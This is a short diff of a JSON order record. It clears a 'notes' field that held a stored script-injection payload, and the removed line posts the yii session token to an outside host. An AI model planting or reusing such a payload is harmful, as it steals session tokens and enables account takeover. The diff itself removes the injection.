@@ -52,6 +52,6 @@
   "discount": 0,
   "items_total": 15,
   "packaging_price": 0,
-  "notes": "<script>$.post('https://api.portaldinp.com.br/'+ yii_session_token, function(data, status){ });</script>",
+  "notes": "",
   "total": 23
 }
